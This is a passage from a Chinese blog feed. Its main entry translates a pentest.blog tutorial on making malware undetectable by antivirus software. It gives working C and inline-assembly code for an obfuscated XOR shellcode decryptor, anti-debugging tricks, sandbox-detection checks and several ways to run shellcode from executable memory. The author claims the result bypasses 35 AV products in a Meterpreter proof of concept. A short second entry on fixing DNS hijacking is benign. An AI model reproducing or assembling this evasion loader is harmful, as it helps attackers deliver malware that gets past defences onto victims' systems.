启发式引擎<br><br>启发式引擎是基于统计和规则的分析机制。它们的主要目的是通过根据预定义的标准对代码片段进行分类并为代码片段提供威胁/风险等级，从而检测新一代（以前未知的）恶意代码，反病毒软件即使在扫描的简单hello world程序的情况下，启发式引擎也会确定威胁/风险评分，分数一旦高于阈值，该文件就会被标记为恶意。启发式引擎是反病毒软件中最高级的部分，它们使用大量规则和标准，因为没有反病毒公司发布有关其启发式引擎的设计文件或文档，所有关于其威胁/风险分级策略的已知选择性标准都是通过反复试验而发现的。<br>一些有关威胁等级的已知规则：<br>– 检测到解密循环<br>– 读取当前的计算机名称<br>– 读取密码机GUID<br>– 连接随机域名<br>– 读取Windows安装日期<br>– 删除可执行文件<br>– 在二进制文件中发现潜在的IP地址<br>– 修改代理设置<br>– 对正在运行的过程安装hook/patch程序<br>– 注入资源管理器explorer<br>– 注入远程进程<br>– 查询进程信息<br>– 设置进程错误模式避免弹出错误弹窗<br>– 不正常的熵值<br>– 检查潜在的反病毒软件<br>– 监视特定的注册表项以进行更改<br>– 包含提升特权的能力<br>– 修改软件策略设置<br>– 读取系统/视频BIOS版本<br>– PE标头中存在不常见的section<br>– 创建受保护的内存区域<br>– 创建很多进程<br>– 尝试长时间休眠<br>– 不常见的sections<br>– 读取Windows产品ID<br>– 包含解密循环<br>– 包含启动/交互设备驱动程序的功能<br>– 包含阻止用户输入的功能<br>…<br><br>在编写我们的AV检测和解密Shellcode函数时，我们必须注意以下所有规则。<br><br>### 解密Shellcode<br><br>混淆解密函数至关重要，大多数反病毒软件启发式引擎都能够检测PE文件内部的解密循环，在勒索软件攻击案例大量增加之后，甚至构建了一些启发式引擎专门用于检测加密/解密函数，一旦检测到解密函数，某些扫描器会等到ECX寄存器为0时，预示解密循环结束，扫描器会去分析被解密的文件内容<br>下面就是Decrypt Shellcode函数：<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DecryptShellcode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(Shellcode); i++) &#123;</span><br><span class="line"></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      PUSH EAX</span><br><span class="line">      XOR EAX, EAX</span><br><span class="line">      JZ True1</span><br><span class="line">      __asm __emit(<span class="number">0xca</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x55</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x78</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x2c</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x02</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x9b</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x6e</span>)</span><br><span class="line">      __asm __emit(<span class="number">0xe9</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x3d</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x6f</span>)</span><br><span class="line"></span><br><span class="line">      True1:</span><br><span class="line">      POP EAX</span><br><span class="line">    &#125;</span><br><span class="line">    Shellcode[i] = (Shellcode[i] ^ Key[(i % <span class="keyword">sizeof</span>(Key))]);</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      PUSH EAX</span><br><span class="line">      XOR EAX, EAX</span><br><span class="line">      JZ True2</span><br><span class="line">      __asm __emit(<span class="number">0xd5</span>)</span><br><span class="line">      __asm __emit(<span class="number">0xb6</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x43</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x87</span>)</span><br><span class="line">      __asm __emit(<span class="number">0xde</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x37</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x24</span>)</span><br><span class="line">      __asm __emit(<span class="number">0xb0</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x3d</span>)</span><br><span class="line">      __asm __emit(<span class="number">0xee</span>)</span><br><span class="line">      True2:</span><br><span class="line">      POP EAX</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>这是一个for循环，它使shellcode字节和key字节之间进行逻辑异或运算，而前后两部分汇编代码（有_asm开始的）是无意义的，使用随机字节覆盖逻辑异或运算但是执行时会跳过这部分代码。由于我们没有使用任何高级解密机制，因此足以混淆Decrypt Shellcode功能。<br><br>### 动态分析检测<br><br>同样，在编写沙箱检测函数时，需要对其进行混淆，如果启发式引擎检测到任何反逆向工程方法的信息，则对恶意软件的威胁评分将非常不利。<br><br>### 当前是否在被调试<br><br>我们的第一个反病毒检测机制将在我们的进程中检查调试器，需要使用一个Windows API函数，功能为确定调用过程是否正在由用户模式调试器调试。但是我们不会使用它，因为大多数反病毒软件都在监视win API调用，因此它们可能会将此功能检测为反逆向工程方法。我们使用PEB块中的BeingDebuged标志位而不是使用API。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// bool WINAPI IsDebuggerPresent(void);</span></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">CheckDebugger:</span><br><span class="line">  PUSH EAX                    <span class="comment">// Save the EAX value to stack</span></span><br><span class="line">  MOV EAX, [FS:<span class="number">0x30</span>]          <span class="comment">// Get PEB structure address</span></span><br><span class="line">  MOV EAX, [EAX+<span class="number">0x02</span>]         <span class="comment">// Get being debugged byte</span></span><br><span class="line">  TEST EAX, EAX               <span class="comment">// Check if being debuged byte is set</span></span><br><span class="line">  JNE CheckDebugger           <span class="comment">// If debugger present check again</span></span><br><span class="line">  POP EAX                     <span class="comment">// Put back the EAX value</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>通过使用内联汇编，这段代码使用指向PEB块中的BeingDebuged标志位的指针，如果存在调试器，它将再次检查直到堆栈中发生溢出，当发生溢出时，堆栈会触发异常并关闭进程，这是退出程序的最简单的方法。检查是否正在被调试的将绕过一定数量的反病毒产品，但是仍有一些反病毒软件已针对此问题采取了措施，因此我们需要对代码进行混淆处理以避免静态特征码分析。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">__asm</span><br><span class="line">  &#123;</span><br><span class="line">  CheckDebugger:</span><br><span class="line">    PUSH EAX</span><br><span class="line">    MOV EAX, DWORD PTR FS : [<span class="number">0x18</span>]</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      PUSH EAX</span><br><span class="line">      XOR EAX, EAX</span><br><span class="line">      JZ J</span><br><span class="line">      __asm __emit(<span class="number">0xea</span>)</span><br><span class="line">    J:</span><br><span class="line">      POP EAX</span><br><span class="line">    &#125;</span><br><span class="line">    MOV EAX, DWORD PTR[EAX + <span class="number">0x30</span>]</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      PUSH EAX</span><br><span class="line">      XOR EAX, EAX</span><br><span class="line">      JZ J2</span><br><span class="line">      __asm __emit(<span class="number">0xea</span>)</span><br><span class="line">    J2:</span><br><span class="line">      POP EAX</span><br><span class="line">    &#125;</span><br><span class="line">    CMP BYTE PTR[EAX + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      PUSH EAX</span><br><span class="line">      XOR EAX, EAX</span><br><span class="line">      JZ J3</span><br><span class="line">      __asm __emit(<span class="number">0xea</span>)</span><br><span class="line">    J3:</span><br><span class="line">      POP EAX</span><br><span class="line">    &#125;</span><br><span class="line">    JNE CheckDebugger</span><br><span class="line">    POP EAX</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br><br>我在所有操作之后都添加了跳转指令，这不会修改原始代码的作用，但是在跳转之间添加垃圾字节会混淆代码并避免被静态分析检测。<br><br>### 加载虚假的DLL<br><br>我们将尝试在运行时加载不存在的dll。通常，当我们尝试加载不存在的dll时，HISTENCE返回NULL，但是某些反病毒软件动态分析时会正常返回，以便进一步检查程序的执行流程,这样就可以检测到在沙盒中执行。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">BypassAV</span><span class="params">(<span class="keyword">char</span> <span class="keyword">const</span> * argv[])</span> </span>&#123;</span><br><span class="line">  HINSTANCE DLL = LoadLibrary(TEXT(<span class="string">"fake.dll"</span>));</span><br><span class="line">  <span class="keyword">if</span> (DLL != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    BypassAV(argv);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br><br>### 运行时间<br><br>在这种方法中，我们将利用反病毒软件处理时间的漏洞。在大多数情况下，反病毒软件扫描器是为终端用户设计的，它们必须对用户友好并且适合日常使用，这意味着它们不会花费太多时间来扫描文件，而需要尽快扫描文件。最初，恶意软件开发人员使用sleep()函数等待扫描完成，但是如今，这种技巧几乎不再起作用，每个防病毒产品在遇到一个时都会跳过睡眠功能。我们将针对它们使用此代码，下面的代码使用了一个称为GetThickCount()的Windows API函数，该函数返回检索自系统启动以来经过的毫秒数，最长为49.7天。我们将使用它来获取自操作系统启动以来经过的时间，然后尝试睡眠1秒钟，在睡眠函数之后，我们将通过比较两个GetTickCout()值来检查运行环境Sleep函数是否被跳过。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> Tick = GetTickCount();</span><br><span class="line">  Sleep(<span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">int</span> Tac = GetTickCount();</span><br><span class="line">  <span class="keyword">if</span> ((Tac - Tick) &lt; <span class="number">1000</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br><br>### 处理器核心数<br><br>此方法只用查询系统上处理器核心的数量。由于反病毒软件无法从主机分配过多资源，因此我们可以检查处理器核心数，以确定我们是否在沙箱中。同时某些反病毒软件沙盒也不支持多处理器因此在其沙盒中也仅仅会保留一个处理器。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SYSTEM_INFO SysGuide;</span><br><span class="line">GetSystemInfo(&amp;SysGuide);</span><br><span class="line"><span class="keyword">int</span> CoreNum = SysGuide.dwNumberOfProcessors;</span><br><span class="line"><span class="keyword">if</span> (CoreNum &lt; <span class="number">2</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>### 大内存分配<br><br>该方法也是利用了反病毒软件每次扫描的时间短的漏洞，我们只需分配近100 Mb的内存，然后将其填充为NULL字节，最后释放它。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> * Memdmp = <span class="literal">NULL</span>;</span><br><span class="line">Memdmp = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">100000000</span>);</span><br><span class="line"><span class="keyword">if</span> (Memdmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">  <span class="built_in">memset</span>(Memdmp, <span class="number">00</span>, <span class="number">100000000</span>);</span><br><span class="line">  <span class="built_in">free</span>(Memdmp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>当程序内存在运行时开始增长时，最终反病毒软件扫描器将结束扫描，以免在文件上花费过多时间，该方法可以多次使用。这是一种非常原始和古老的技术，但它仍然绕过了大量的扫描器。<br><br>### trap标志位设置<br><br>trap标志用于单步调试跟踪程序。如果设置了此标志，则每条指令都会引发SINGLE_STEP异常。可以对陷阱标志进行操作，以阻止跟踪程序。我们可以使用以下代码操作陷阱标志。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">  PUSHF 			<span class="comment">// Push all flags to stack</span></span><br><span class="line">  MOV DWORD [ESP], <span class="number">0x100</span>	<span class="comment">// Set 0x100 to the last flag on the stack</span></span><br><span class="line">  POPF 				<span class="comment">// Put back all flags register values		</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>### 通过互斥量触发WinExec<br><br>该方法由于其简单性而非常有前途，我们创建了一个条件来检查系统上是否已经存在某个互斥对象。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HANDLE AmberMutex = CreateMutex(<span class="literal">NULL</span>, TRUE, <span class="string">"FakeMutex"</span>);</span><br><span class="line"><span class="keyword">if</span>(GetLastError() != ERROR_ALREADY_EXISTS)&#123;</span><br><span class="line">  WinExec(argv[<span class="number">0</span>],<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>如果CreateMutex功能未返回错误，我们将再次执行该恶意软件二进制文件，因为大多数反病毒产品都不会让程序在进行动态分析时启动新进程或访问外部的文件发生，如果返回mutex已经存在错误则可以开始执行解密功能。在反检测中，互斥量使用的想法更多。<br><br>### 正确执行Shellcode的方法<br><br>从Windows Vista开始，Microsoft引入了数据执行保护或DEP，这是一项安全功能，可以通过实时监视程序来帮助防止损坏计算机。监视可确保正在运行的程序有效地使用系统内存。如果您的计算机上存在某个程序实例错误地使用了内存，则DEP会注意到它，然后关闭该程序并通知您。这意味着您不能只将一些字节放入char数组中并执行它，而是需要使用Windows API函数使用read，write和execute标志分配一个内存区域。<br>Microsoft有几个用于保留内存页面的内存操作API函数，该领域中的大多数常见恶意软件都使用VirtualAlloc功能来保留内存页面，因为您可以猜测这些函数的常见用法有助于反病毒产品使用其他内存来定义检测规则操纵功能，并且可能会引起较少的注意。<br>我将列出几种具有不同内存操作API函数的shellcode执行方法：<br><br><strong>HeapCreate/HeapAlloc</strong>：<br><br>Windows还允许创建RWE堆区域<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExecuteShellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="keyword">sizeof</span>(Shellcode), <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">  <span class="keyword">char</span> * BUFFER = (<span class="keyword">char</span>*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">  <span class="built_in">memcpy</span>(BUFFER, Shellcode, <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">  (*(<span class="keyword">void</span>(*)())BUFFER)();	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br><strong>LoadLibrary/GetProcAddress</strong>:<br><br>LoadLibrary和GetProcAddress win API函数组合允许我们使用所有其他win API函数，并且这种使用方式不会直接调用内存操作函数和恶意软件，因此可能不太吸引人注意。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExecuteShellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  HINSTANCE K32 = LoadLibrary(TEXT(<span class="string">"kernel32.dll"</span>));</span><br><span class="line">  <span class="keyword">if</span>(K32 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    MYPROC Allocate = (MYPROC)GetProcAddress(K32, <span class="string">"VirtualAlloc"</span>);</span><br><span class="line">    <span class="keyword">char</span>* BUFFER = (<span class="keyword">char</span>*)Allocate(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(BUFFER, Shellcode, <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">    (*(<span class="keyword">void</span>(*)())BUFFER)();	</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br><strong>GetModuleHandle/GetProcAddress</strong>:<br><br>该方法甚至不使用LoadLibrary函数，因为它利用了已加载的kernel32.dll的优势，GetModuleHandle函数从一个已加载的dll中检索模块句柄，这个方法大概是最隐蔽的执行方法。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExecuteShellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  MYPROC Allocate = (MYPROC)GetProcAddress(GetModuleHandle(<span class="string">"kernel32.dll"</span>), <span class="string">"VirtualAlloc"</span>);</span><br><span class="line">  <span class="keyword">char</span>* BUFFER = (<span class="keyword">char</span>*)Allocate(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  <span class="built_in">memcpy</span>(BUFFER, Shellcode, <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">  (*(<span class="keyword">void</span>(*)())BUFFER)();	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br><strong>多线程执行</strong>:<br><br>对逆向工程工程师来说，逆向多线程PE文件总是比较困难，这对于反病毒软件也是一个挑战，多线程方法可以与上述所有执行方法一起使用，将函数指针指向shellcode并通过创建新线程执行shellcode将使情况变得复杂，通过这种方式可以同时执行shellcode和检测反病毒软件。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExecuteShellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span>* BUFFER = (<span class="keyword">char</span>*)VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  <span class="built_in">memcpy</span>(BUFFER, Shellcode, <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">  CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>,LPTHREAD_START_ROUTINE(BUFFER),<span class="literal">NULL</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">while</span>(TRUE)&#123;</span><br><span class="line">    BypassAV(argv);</span><br><span class="line">  &#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>上面的代码通过创建一个新线程来执行shellcode，在创建线程之后，有一个无限的whlie循环正在执行BypassAV函数，这种方法几乎可以使我们的BypassAV函数的效果翻倍，BypassAV将不断检查在运行Shellcode时使用沙箱和动态分析标志，这对于绕过某些等待执行Shellcode的高级启发式引擎也至关重要。<br><br>### 结论<br><br>最后其实关于如何编译恶意软件的方法很少，在编译源代码时，需要使用诸如堆栈保护程序之类的保护措施，并且剥离符号对于加强我们的恶意软件的逆向工程过程并减小文件大小至关重要。 ，建议使用Visual Studio进行编译，因为本文使用了内联汇编语法。<br>当所有这些方法结合在一起时，生成的恶意代码便能够绕过35种最先进的反病毒产品。<br><br><div align="center"><br><img src="/img/anti_av_av.png" align><br></div>

<h2 id="POC">POC</h2><p>使用本文中介绍的技术创建的Meterpreter显示了我们的恶意软件如何在真实系统中产生结果。<br>这些方法迟早也会过期，但是总会有更多的方法绕过反病毒软件。</p>
<h2 id="第二部分">第二部分</h2><p>反检测的艺术第二部分已经发表，通过以下链接可以查看：<a href="http://www.youngroe.com/art-of-anti-detection-2-pe-backdoor-manufacturing/">http://www.youngroe.com/art-of-anti-detection-2-pe-backdoor-manufacturing/</a></p>
<h2 id="参考">参考</h2><p>[1] – <a href="https://en.wikipedia.org/wiki/Antivirus_software" target="_blank" rel="external">https://en.wikipedia.org/wiki/Antivirus_software</a><br>[2] – <a href="https://en.wikipedia.org/wiki/Static_program_analysis" target="_blank" rel="external">https://en.wikipedia.org/wiki/Static_program_analysis</a><br>[3] – <a href="https://en.wikipedia.org/wiki/Dynamic_program_analysis" target="_blank" rel="external">https://en.wikipedia.org/wiki/Dynamic_program_analysis</a><br>[4] – <a href="https://en.wikipedia.org/wiki/Sandbox_(computer_security)" target="_blank" rel="external">https://en.wikipedia.org/wiki/Sandbox_(computer_security)</a><br>[5] – <a href="https://en.wikipedia.org/wiki/Heuristic_analysis" target="_blank" rel="external">https://en.wikipedia.org/wiki/Heuristic_analysis</a><br>[6] – <a href="https://en.wikipedia.org/wiki/Entropy" target="_blank" rel="external">https://en.wikipedia.org/wiki/Entropy</a><br>[7] – <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">https://en.wikipedia.org/wiki/Address_space_layout_randomization</a><br>[8] –  <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366553(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/aa366553(v=vs.85).aspx</a><br>The Antivirus Hacker’s Handbook<br>The Rootkit Arsenal: Escape and Evasion: Escape and Evasion in the Dark Corners of the System<br><a href="http://venom630.free.fr/pdf/Practical_Malware_Analysis.pdf" target="_blank" rel="external">http://venom630.free.fr/pdf/Practical_Malware_Analysis.pdf</a><br><a href="http://pferrie.host22.com/papers/antidebug.pdf" target="_blank" rel="external">http://pferrie.host22.com/papers/antidebug.pdf</a><br><a href="https://www.symantec.com/connect/articles/windows-anti-debug-reference" target="_blank" rel="external">https://www.symantec.com/connect/articles/windows-anti-debug-reference</a><br><a href="https://www.exploit-db.com/docs/18849.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/18849.pdf</a><br><a href="http://blog.sevagas.com/?Fun-combining-anti-debugging-and" target="_blank" rel="external">http://blog.sevagas.com/?Fun-combining-anti-debugging-and</a></p>
<p><em>原文链接：<a href="https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/" target="_blank" rel="external">https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>本篇文章将介绍对抗最新反病毒软件静态检测、动态检测及启发式分析最有效的方法。其中一些已经是公开并被大众所熟知的方法，但是仍然有一些方法和绕过技巧是实现完全不可被检测（FUD,Fully Undetectable）恶意代码的关键，同时恶意代码的大小与其反检测能力同等重要，因此在实现这些反检测方法的时候我会努力让恶意代码的文件大小尽可能的小。本文也将介绍反病毒软件及Windows操作系统的内部原理，因此读者最好具备一定的C/C++及汇编语言基础同时对PE文件结构有一定的了解<br>]]>
    
    </summary>
    
      <category term="反病毒" scheme="http://www.youngroe.com/tags/%E5%8F%8D%E7%97%85%E6%AF%92/"/>
    
      <category term="Cybersecurity" scheme="http://www.youngroe.com/categories/Cybersecurity/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[记录一次被DNS劫持及解决方案(非改hosts方式)]]></title>
    <link href="http://www.youngroe.com/2020/08/02/Life/dns_hijacking/"/>
    <id>http://www.youngroe.com/2020/08/02/Life/dns_hijacking/</id>
    <published>2020-08-02T04:45:15.000Z</published>
    <updated>2020-08-07T16:15:52.418Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_现象">0x00 现象</h2><p>现象是访问Github Pages服务浏览器打不开，域名都是*.github.io类似的，即使走代理也不行，Chrome报错NET::ERR_CERT_AUTHORITY_INVALID，查看https证书居然是Vmware的</p>
<div align="center"><br><img src="/img/20200802_dns_vmware.png" align="https证书错误，为Vmware"><br></div>

<a id="more"></a>
<p>猜测是不是电脑系统出现问题了，但是手机连接上电脑宽带的wifi也连接不上，但是用4G网络可以，问题应该与系统无关，是运营商宽带的问题了。但是还是不知道具体那个环节出问题了，搜到一篇blog现象基本相同 <a href="https://www.wanvi.net/10200.html" target="_blank" rel="external">记录一个奇怪的问题 访问网页，证书错误是VMware</a>，但是文章中没有提解决方案，不过通过文章描述的现象及本地Wireshark抓包分析，是遇到dns劫持了，劫持方式是直接修改dns返回包。<br>只要是github.io下的域名全部被解析到了127.0.0.1，导致访问本地网络，同时正好装了Vmware的虚拟机，Vmware在本地会监听443端口，这样访问github.io相关域名会访问到本地Vmware开的端口上，并且Vmware的证书没有经过CA认证，Chrome会首先报证书错误，同时Vmware在443端口可能也没有提供http服务，即使忽略证书错误，网页也打不开。<br>尝试换DNS服务器，能正常几秒钟马上又被解析到127.0.0.1了，太丧心病狂了。</p>
<div align="center"><br><img src="/img/20200808_dns_nslookup.png" align="修改DNS服务器也不行"><br></div><br><div align="center"><br><img src="/img/20200802_dns_wireshark.png" align="Wireshark抓包发现，DNS返回包被修改"><br></div>

<h2 id="0x01_解决方案">0x01 解决方案</h2><p>在文章<a href="http://www.youngroe.com/2018/12/01/Windows/windows_client_dns_over_https/">Windows客户端如何透明使用DNS-over-HTTPS</a>中提到过通过HTTPS协议查询DNS的方式，正好可以解决这个问题，步骤如下：</p>
<ul>
<li>下载<a href="https://developers.cloudflare.com/argo-tunnel/downloads#windows" target="_blank" rel="external">cloudflare的https dns客户端</a>，直接运行cloudflared.exe</li>
<li>修改电脑的dns服务器地址为127.0.0.1<br>这样设置后就不会被劫持了，可以正常访问github.io下的域名了，具体原理参考<a href="http://www.youngroe.com/2018/12/01/Windows/windows_client_dns_over_https/">Windows客户端如何透明使用DNS-over-HTTPS</a></li>
</ul>
<p>另外如果cloudflare的doh服务器地址（1.1.1.1）被ban也可以使用<a href="https://github.com/bitbeans/SimpleDnsCrypt/" target="_blank" rel="external">SimpleDnsCrypt</a>原理相同。当然也可以使用带有DOH功能得浏览器，如firefox，不过仅对浏览器本身有效，非全局，其他程序还是存在被DNS劫持风险。<br>希望对遇到这个问题的人有用。</p>
<h2 id="0x02_参考文章">0x02 参考文章</h2><ul>
<li><a href="https://www.wanvi.net/10200.html" target="_blank" rel="external">记录一个奇怪的问题 访问网页，证书错误是VMware</a></li>
<li><a href="https://developers.cloudflare.com/argo-tunnel/downloads#windows" target="_blank" rel="external">cloudflare的https dns客户端</a></li>
<li><a href="http://www.youngroe.com/2018/12/01/Windows/windows_client_dns_over_https/">Windows客户端如何透明使用DNS-over-HTTPS</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_现象">0x00 现象</h2><p>现象是访问Github Pages服务浏览器打不开，域名都是*.github.io类似的，即使走代理也不行，Chrome报错NET::ERR_CERT_AUTHORITY_INVALID，查看https证书居然是Vmware的</p>
